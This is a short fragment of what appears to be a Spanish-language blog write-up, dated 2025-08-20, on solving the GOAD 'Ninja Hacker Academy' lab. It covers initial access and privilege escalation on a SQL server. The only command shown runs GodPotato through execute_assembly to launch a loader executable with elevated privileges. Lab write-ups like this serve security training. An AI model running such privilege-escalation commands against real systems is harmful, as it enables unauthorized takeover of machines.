...
excerpt: "En esta serie de artículos vamos a resolver el laboratorio Ninja Hacker Academy de la plataforma GOAD. En esta primera parte veremos una descripción del laboratorio, y obtendremos el acceso inicial y escalaremos privilegios en el servidor SQL."
date: 2025-08-20
classes: wide
header:
...
```bash
execute_assembly -Assembly GodPotato-NET4.exe -Arguments -cmd "C:\windows\tasks\SimpleLoader.exe"
```
